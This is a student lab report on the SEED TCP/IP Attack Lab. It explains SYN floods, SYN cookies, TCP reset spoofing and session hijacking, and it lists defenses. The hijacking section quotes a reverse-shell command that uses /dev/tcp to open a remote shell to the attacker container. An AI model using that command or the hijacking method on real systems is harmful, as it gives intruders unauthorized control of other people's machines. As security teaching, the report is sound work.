# Lab Report: TCP/IP Attack Lab
## 🎯 Objective
To gain hands-on experience with several low-level attacks on the TCP/IP protocol suite, specifically exploring vulnerabilities in the three-way handshake and session management

## 🛠️ Environment & Tools
- **System:** Docker Container Environment (SEED VM).
- **Key Tools:** Scapy (Python-based packet manipulation), Telnet, Netcat.
- **Network Setup:** A victim container (10.9.0.5), a trusted server (10.9.0.6), and an attacker container (10.9.0.105).

## 💡 Key Learning & Tips
### The Three-Way Handshake Vulnerability
I learned that an attacker can initiate a SYN Flood by sending a high volume of SYN packets to a server but never completing the handshake. This exhausts the server's "half-open" connection queue, preventing legitimate users from connecting.
### SYN Cookies as a Defense
I observed that modern Linux systems use SYN Cookies to defend against these floods. When the queue fills up, the server encodes connection info into the Sequence Number rather than storing it in memory, allowing it to remain responsive.
### TCP Reset (RST) Attack
I discovered that any established TCP connection can be forcibly closed if an attacker can sniff the traffic and spoof a packet with the RST flag set and the correct Sequence Number.
### TCP Session Hijacking
This was the most complex task. By predicting or sniffing the Next Sequence Number, I was able to inject malicious data into an active Telnet session.Reverse Shell Injection: I combined session hijacking with a Reverse Shell attack. By injecting the command /bin/bash -i > /dev/tcp/10.9.0.105/9090 0<&1 2>&1 into the hijacked session, I forced the victim to give the attacker a remote command prompt.

## 🔍 Troubleshooting Log
| Issue Encountered | Root Cause | Solution/Observation |
| --- | --- | --- |
| SYN Flood not working | SYN Cookies were enabled on the server. | Disable them temporarily using sysctl -w net.ipv4.tcp_syncookies=0 for the lab simulation. |
| RST Attack failed | The spoofed Sequence Number was outside the receiver's window. | Use a sniffer (like Wireshark) to identify the exact Next Sequence Number before sending the RST packet. |
| Hijacking caused a "Storm" | The victim and attacker entered an ACK loop. | This is a side effect of session hijacking where both sides try to resynchronize sequence numbers. |

## 🏁 Summary of Defense
1. **Enable SYN Cookies:** This is a critical built-in defense against resource exhaustion.
2. **Use Encryption (SSH/HTTPS):** TCP/IP attacks rely on seeing or predicting sequence numbers. Using encrypted protocols makes the payload and headers (like Telnet) unreadable to sniffers.
3. **Sequence Number Randomization:** Modern operating systems use high-entropy random sequence numbers to make "blind" hijacking nearly impossible.
